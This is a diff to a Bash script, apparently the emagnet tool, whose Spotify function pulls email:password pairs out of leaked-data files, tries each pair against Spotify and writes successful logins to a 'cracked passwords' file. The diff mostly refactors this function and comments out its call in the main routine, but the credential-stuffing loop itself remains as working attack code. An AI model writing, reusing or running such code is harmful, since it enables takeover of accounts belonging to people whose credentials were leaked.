@@ -738,15 +738,12 @@ done < $HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt
 }
 
 emagnet_spotify_bruter() {
-VERSION="0.6.0"
-WWWSOURCE="https://nr1.nu/archive/sconsify"
-SCONSIFY="${WWWSOURCE}/linux-x86_64-sconsify-${VERSION}.next.zip"
 SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
      grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
     |awk '{print $1}' \
     |cut -d':' -f2,3 \
     |cut -d'|' -f1 \
-    |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt
+    |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $SPOTIFY_TARGETS
 	     while read line; do
                	SPOTIFY_USER="$(echo $line|cut -d: -f1)"
       	        SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
@@ -754,11 +751,11 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
 	             if [[ "$?" -eq "0" ]]; then
         	      echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
                else
-                      grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
-                     |awk '{print $1}' \
-                     |cut -d':' -f2,3 \
-                     |cut -d'|' -f1 \
-                     |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt
+#                     grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
+#                     |awk '{print $1}' \
+#                     |cut -d':' -f2,3 \
+#                     |cut -d'|' -f1 \
+#                     |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt
               	        echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
             	        echo -e "================================================================"      >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
              	        echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"   >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
@@ -768,19 +765,9 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
              	        echo -e "================================================================\n\n"  >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
                	        echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" >>    "$HOME/.config/emagnet/tmp/.emagnet-cracked"
                        	echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"   >>    "$HOME/.config/emagnet/tmp/.emagnet-failed"
-                        SUCCEED="$(cat $HOME/.config/emagnet/tmp/.emagnet-cracked|grep 'Cracked Password'|wc -l)" 
-                        FAILED="$(cat $HOME/.config/emagnet/tmp/.emagnet-failed|grep 'Wrong Pasword'|wc -l)"
               fi
-        done < "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt"
-        rm "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt" 
-        if [[ $FAILED -gt "0" ]]; then
-                  printf "%64s \n" | tr ' ' '='
-                  echo -e "Done! Successfully cracked $SUCCEED accounts and $FAILED failed.. \n"
-                  sleep 3
-                  rm "$HOME/.config/emagnet/tmp/.emagnet-{failed,cracked}"
-             else
-                  sleep 0
-           fi
+            done < $SPOTIFY_TARGETS
+
 }
 
 emagnet_gmail_bruter() {
@@ -1269,7 +1256,7 @@ case "${1}" in
                                 printf "\n%64s \n\n" | tr ' ' '='
                                 emagnet_run4ever
                                 printf "\n%64s \n\n" | tr ' ' '='
-                                emagnet_spotify_bruter
+                                #emagnet_spotify_bruter
                  fi
                                 mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
                 else
